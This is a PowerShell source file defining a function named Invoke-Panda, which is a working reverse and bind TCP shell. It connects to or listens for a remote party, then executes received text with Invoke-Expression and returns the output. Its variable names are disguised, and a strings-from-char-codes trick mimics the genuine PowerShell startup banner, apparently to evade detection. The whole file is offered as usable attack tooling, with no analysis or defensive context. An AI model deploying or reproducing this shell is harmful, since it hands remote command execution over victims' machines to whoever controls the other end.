function Invoke-Panda {
    [CmdletBinding(DefaultParameterSetName="reverse")]
    Param(
        [Parameter(Position=0,Mandatory=$true,ParameterSetName="reverse")]
        [Parameter(Position=0,Mandatory=$false,ParameterSetName="bind")]
        [String]$v4,

        [Parameter(Position=1,Mandatory=$true,ParameterSetName="reverse")]
        [Parameter(Position=1,Mandatory=$true,ParameterSetName="bind")]
        [Int]$door,

        [Parameter(ParameterSetName="reverse")]
        [Switch]$rev,

        [Parameter(ParameterSetName="bind")]
        [Switch]$B
    )

    try {
        if ($rev) {
            $C=New-Object System.Net.Sockets.TCPClient($v4,$door)
        }
        if ($B) {
            $L=[System.Net.Sockets.TcpListener]$door
            $L.start()
            $C=$L.AcceptTcpClient()
        }

        $S=$C.GetStream()
        [byte[]]$B=0..65535|%{0}

        $U="Windows PowerShell running as user "+$env:username+" on "+$env:computername
        $U+=[char]169+[char]174+[char]224+[char]128+[char]173+[char]191+[char]222+[char]185+[char]170
        $U+="`nCopyright"+" (C) "+[char]2015+" "+[char]77+[char]105+[char]99+[char]114+[char]111+[char]115+[char]111+[char]102+[char]116+[char]32+[char]67+[char]111+[char]114+[char]112+[char]111+[char]114+[char]97+[char]116+[char]105+[char]111+[char]110+". All rights reserved.`n`n"
        $SB=([text.encoding]::ASCII).GetBytes($U)
        $S.Write($SB,0,$SB.Length)

        $doorrompt='PS '+(Get-Location).Path+'>'
        $SB=([text.encoding]::ASCII).GetBytes($doorrompt)
        $S.Write($SB,0,$SB.Length)

        while (($I=$S.Read($B,0,$B.Length))-ne 0) {
            $ET=New-Object -TypeName System.Text.ASCIIEncoding
            $D=$ET.GetString($B,0,$I)
            try {
                $CommandOutput=(Invoke-Expression $D 2>&1|Out-String)
                $SB=([text.encoding]::ASCII).GetBytes($CommandOutput)
                $S.Write($SB,0,$SB.Length)

                $doorrompt='PS '+(Get-Location).Path+'>'
                $SB=([text.encoding]::ASCII).GetBytes($doorrompt)
                $S.Write($SB,0,$SB.Length)
            }
            catch {
                Write-Warning "Something went wrong with the execution of the command on the target."
                Write-Error $_

                $doorrompt='PS '+(Get-Location).Path+'>'
                $SB=([text.encoding]::ASCII).GetBytes($doorrompt)
                $S.Write($SB,0,$SB.Length)
            }

            $S.Flush()
        }

        $C.Close()
        if ($L) {
            $L.Stop()
        }
    }
    catch {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}
